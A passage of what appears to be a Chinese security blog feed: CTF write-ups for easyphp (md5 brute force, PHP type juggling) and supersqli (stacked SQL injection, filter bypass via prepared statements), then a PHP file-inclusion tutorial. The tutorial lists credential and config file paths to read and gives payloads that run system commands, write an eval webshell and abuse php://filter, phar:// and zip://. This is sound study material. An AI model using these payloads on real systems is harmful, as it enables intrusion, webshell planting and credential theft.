<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
</ol>
<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终得出参数b的值为：53724</p>
<ol start="4">
<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
</ul>
<p>于是我们可以构造出c[“m”]的值为：12345a</p>
<ul>
<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
</ul>
<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_supersqli</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p>
<span id="more"></span>
<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p>
</li>
<li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p>
</li>
<li><p>获取flag</p>
</li>
</ol>
<ul>
<li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<p>即可获得flag</p>
</li>
<li><p>方法2：改表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
<p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p>
</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>CTF</tag>
        <tag>堆叠注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2022/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含漏洞和文件上传漏洞还是有些相像的，但是文件包含难度要更大一些。</p>
<span id="more"></span>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>PHP中文件包含函数有以下四种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require() 			文件包含过程中出现错误，抛出警告，之后继续正常执行</span><br><span class="line">require_once() 		与require()函数相同，但文件只包含第一次</span><br><span class="line">include() 			文件包含过程中出现错误，抛出错误，退出程序执行</span><br><span class="line">include_once() 		与include()函数相同，但文件只包含第一次</span><br></pre></td></tr></table></figure>
<p>php开启错误提醒需要配置php.ini中disaply_errors为On</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>文件包含漏洞是一种Web漏洞 ，最常被发现会影响依赖脚本运行时的Web 应用程序。当应用程序使用攻击者控制的变量以允许攻击者控制在运行时执行哪个文件的方式构建可执行代码的路径时，会导致此问题。文件包含漏洞不同于一般的目录遍历攻击，因为目录遍历是一种获取未经授权的文件系统访问的方式，而文件包含漏洞会破坏应用程序加载代码以供执行的方式。成功利用文件包含漏洞将导致在运行受影响的 Web 应用程序的Web 服务器上远程执行代码。攻击者可以使用远程代码执行在网络服务器上创建网络外壳，用于网站篡改。</p>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>文件包含函数加载的参数未经过过滤或严格的定义，可以被用户控制，包含其它恶意文件，导致执行非预期代码。<br>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$_GET[&#39;filename&#39;]</code><br>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改 <code>$_GET[&#39;filename&#39;]</code> 的值，执行非预期的操作。</p>
<ul>
<li>Web 应用实现了动态包含</li>
<li>动态包含的文件路径参数，客户端可控</li>
</ul>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>无视文件扩展名读取文件<br>包含文件时，PHP会读取文件的源码，包括图片文件。尝试包含图片，示例如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.12.32.138/fileInclude/fileinclude.php?path=smile.jpg</span><br></pre></td></tr></table></figure></li>
<li>无条件解析PHP代码<br>文件包含在读取文件源码的同时，如果遇到符合PHP语法规范的代码，就会无条件执行。<br>例如，将info.php的后缀改为info.rar，依然能显示phpinfo()信息。<br>这也为图片木马提供了一种利用方法。</li>
</ol>
<h1 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h1><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>当 Web 应用程序下载并执行远程文件时，会发生远程文件包含( RFI )。这些远程文件通常以HTTP或FTP URI的形式作为用户提供给 Web 应用程序的参数获取。<br>这个允许我们包含远程服务的文件并执行，需要对php.ini进行配置：</p>
<ul>
<li>allow_url_fopen &#x3D; On （默认为On）</li>
<li>allow_url_include &#x3D; On （php5.2之后默认为Off）<br>只有两个配置项都为On时才能利用</li>
</ul>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>本地文件包含( LFI ) 类似于远程文件包含漏洞，只是不包含远程文件，而是只包含本地文件，即当前服务器上的文件，以便执行。这个问题仍然可以通过包含一个包含攻击者控制的数据（例如 Web 服务器的访问日志）的文件来导致远程代码执行。</p>
<h1 id="查看的敏感文件的绝对路径"><a href="#查看的敏感文件的绝对路径" class="headerlink" title="查看的敏感文件的绝对路径"></a>查看的敏感文件的绝对路径</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WINDOWS下:</span><br><span class="line">c:/boot.ini //查看系统版本</span><br><span class="line"></span><br><span class="line">c:/windows/php.ini //php配置信息</span><br><span class="line"></span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line"></span><br><span class="line">c:/winnt/php.ini</span><br><span class="line"></span><br><span class="line">c:/winnt/my.ini</span><br><span class="line"></span><br><span class="line">C:\Windows\win.ini  //用于保存系统配置文件</span><br><span class="line"></span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</span><br><span class="line"></span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</span><br><span class="line"></span><br><span class="line">//存储了pcAnywhere的登陆密码</span><br><span class="line"></span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</span><br><span class="line"></span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</span><br><span class="line"></span><br><span class="line">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line"></span><br><span class="line">C:\Program Files\mysql\my.ini</span><br><span class="line"></span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LUNIX/UNIX 下:</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.cnf //mysql的配置文件</span><br><span class="line"></span><br><span class="line">/etc/redhat-release //系统版本</span><br><span class="line"></span><br><span class="line">/etc/issue</span><br><span class="line"></span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略</span><br></pre></td></tr></table></figure>

<h1 id="包含方式"><a href="#包含方式" class="headerlink" title="包含方式"></a>包含方式</h1><p>下面例子中测试代码均为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
<p>allow_url_fopen 默认为 On<br>allow_url_include 默认为 Off<br>若有特殊要求，会在利用条件里指出。</p>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。<br>PHP伪协议事实上就是支持的协议与封装协议（12种）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">phar:// — PHP 归档</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — 音频流</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><figure class="highlight plaintext"><figcaption><span>伪协议用于访问本地文件系统</span></figcaption><table><tr><td class="code"><pre><span class="line">**利用条件：**</span><br><span class="line">* 对allow_url_include不做要求</span><br><span class="line">* 对allow_url_fopen不做要求</span><br><span class="line">**示例**</span><br></pre></td></tr></table></figure>
<p>fileinclude.php?file&#x3D;file:&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### php://input</span><br><span class="line">可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。</span><br></pre></td></tr></table></figure>
<p>enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**利用条件：**</span><br><span class="line">* allow_url_include = On。</span><br><span class="line">* allow_url_fopen不做要求。</span><br><span class="line">**示例**</span><br></pre></td></tr></table></figure>
<p>fileinclude.php?file&#x3D;php:&#x2F;&#x2F;input</p>
<p>POST:<br><?php phpinfo(); ?></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**注意：**</span><br><span class="line">碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</span><br><span class="line">file_get_contents()：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。</span><br><span class="line">除此之外，这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像curl命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面php://input可以将POST的数据读过来来赋值给参数。</span><br><span class="line">**测试代码：**</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（命令执行）"><a href="#php-x2F-x2F-input（命令执行）" class="headerlink" title="php:&#x2F;&#x2F;input（命令执行）"></a>php:&#x2F;&#x2F;input（命令执行）</h3><p><strong>利用条件：</strong><br>allow_url_include:On<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinlcude.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php system(&#x27;whoami&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="php-x2F-x2F-input（写入木马）"><a href="#php-x2F-x2F-input（写入木马）" class="headerlink" title="php:&#x2F;&#x2F;input（写入木马）"></a>php:&#x2F;&#x2F;input（写入木马）</h3><p><strong>利用条件：</strong><br>allow_url_include:On<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php fputs(fopen(&#x27;hack.php&#x27;,&#x27;w&#x27;), &#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;) ;?&gt;</span><br></pre></td></tr></table></figure>
<p>执行完后，同目录下就生成了一句话木马。用shell管理工具，比如蚁剑等便能成功连接。</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>元封装器，设计用于<strong>数据流打开</strong>时的<strong>筛选过滤</strong>应用，对本地磁盘文件进行读写。<br><strong>利用条件：</strong><br>allow_url_include 不做要求<br>allow_url_fopen 不做要求<br><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=php://filter/read=convert-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">另一种 fileinclude.php?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">//效果和前一种相同，少了read等关键字，在绕过一些waf时也许有用</span><br></pre></td></tr></table></figure>
<p>通过指定末尾的文件，可以读取经过base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也比较大</p>
<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>phar:&#x2F;&#x2F; 就是php解压缩包的一个伪协议，不管后缀是什么，都会当作压缩包来解压。<br><strong>利用条件：</strong><br>php版本大于等于5.3.0<br>对allow_url_include不做要求<br>对allow_url_fopen不做要求<br><strong>示例</strong><br>写一个文件phpinfo.php，其内容为<?php phpinfo(); ?>，打包成zip压缩文件格式的压缩包，如下：<br><img src="/simg/File_include.png" alt=" "><br>指定绝对路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=phar://D:/phpstudy/WWW/test.zip/phpinfo.php</span><br></pre></td></tr></table></figure>
<p>或者使用相对路径（这里test.zip就在当前目录下，和fileinclude.php同一目录）:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=phar://test.zip/phpinfo.php</span><br></pre></td></tr></table></figure>
<p>先访问url地址，然后马儿就写进去了。<br>然后用shell管理工具，将上面两个的url地址随便选一个，填写到shell管理工具的url地址里，比如蚁剑等便能成功连接。<br><strong>注意：</strong><br>其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip伪协议与phar伪协议类似，但是用法不同。<br><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式</strong><br>构造zip包的方法同phar：<br>写一个文件phpinfo.php，其内容为<?php phpinfo(); ?>，打包成zip压缩文件格式的压缩包<br>但是使用zip伪协议，需要指定绝对路径，而且压缩包文件和压缩包内的文件之间得用#，还要将#给URL编码为%23，之后填上压缩包内的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=zip://D:/phpStudy/WWW/test.zip%23phpinfo.php</span><br></pre></td></tr></table></figure>
<p>若是使用相对路径，则会文件包含失败。<br>这里需要注意的和phar:&#x2F;&#x2F;中的注意一样，其中test.zip必须得是以zip压缩文件格式压缩，其它像rar、7z这样的压缩文件格式就不行了。不过test.zip的后缀可以不是zip，可以是像test.jpg，甚至test.111这样的后缀都行。这里就涉及到了绕过了，如果zip后缀不让上传，那么就修改为test.111这样的后缀肯定不会被拦截了，这时就能成功。</p>
<h3 id="zip-x2F-x2F-命令执行"><a href="#zip-x2F-x2F-命令执行" class="headerlink" title="zip:&#x2F;&#x2F;(命令执行)"></a>zip:&#x2F;&#x2F;(命令执行)</h3><p><strong>利用条件：</strong><br>php版本大于等于php5.3.0<br>对allow_url_include不做要求。<br>对allow_url_fopen不做要求。<br><strong>方式</strong><br>同zip:&#x2F;&#x2F;，只不过把文件内容改成<?php system('whoami');?></p>
